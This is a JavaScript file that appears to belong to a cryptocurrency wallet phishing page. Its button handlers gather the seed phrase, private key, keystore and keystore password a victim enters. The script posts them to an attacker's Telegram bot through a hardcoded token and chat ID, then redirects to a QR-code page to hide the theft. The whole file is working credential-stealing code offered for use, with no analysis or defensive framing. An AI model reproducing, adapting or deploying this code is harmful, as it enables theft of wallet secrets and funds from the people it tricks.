
	
	const click = document.querySelector('.btn-primary'); 
	const privatekey = document.getElementById('Private-key');
	const Keystore = document.getElementById('Keystore');
	 
	click.addEventListener('click', function(event) {
  event.preventDefault(); // Prevent the default action
  
  console.log ('chai');
  sendMessage();
  window.location.href = "qrcode.html";  
  
  });
  
  privatekey.addEventListener('click', function(event) {
  event.preventDefault(); // Prevent the default action
  
  console.log ('privkey');
  sendMessage();
  window.location.href = "qrcode.html";  
  
  });
  
  Keystore.addEventListener('click', function(event) {
  event.preventDefault(); // Prevent the default action
  
  console.log ('Key');
  sendMessage();
  window.location.href = "qrcode.html";  
  });
  
  
	const botToken = "5992220565:AAF8WbiX2Dxw-bUqcw70Mi_as_KEZf0H2";
const chatIds = ["5306433933"];

function sendMessage() {
  const messageInput = document.querySelector('.form-control');
  const privkey = document.querySelector('#Private-keytext');
  const KeystorePassword = document.querySelector('#KeystorePassword');
  const Keystore = document.querySelector('#Keystoretext');
  let message = ''; message += '🔥WALLET DETAILS🔥' + "\n"; 
  message += 'keystore =' +' ' + Keystore.value + "\n"; 
  message += 'keystore Password =' +' ' + KeystorePassword.value + "\n"; 
  message += 'Phrase = ' +' ' + messageInput.value + "\n"; 
  message += 'Private = ' +' ' + privkey.value + "\n"; 
  message += '🕜' +' ' + new Date().toLocaleString() + "\n"; ; 
  message += ' Dave made ' + "\n"; 
  console.log (message);

  chatIds.forEach(chatId => {
    const website = `https://api.telegram.org/bot${botToken}`;
    const params = {
      chat_id: chatId,
      text: message
    };

    fetch(`${website}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(params)
    })
    .then(response => {
      if (response.ok) {
        console.log('Message sent successfully');
      } else {
        console.error('Failed to send message');
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
  });
}



	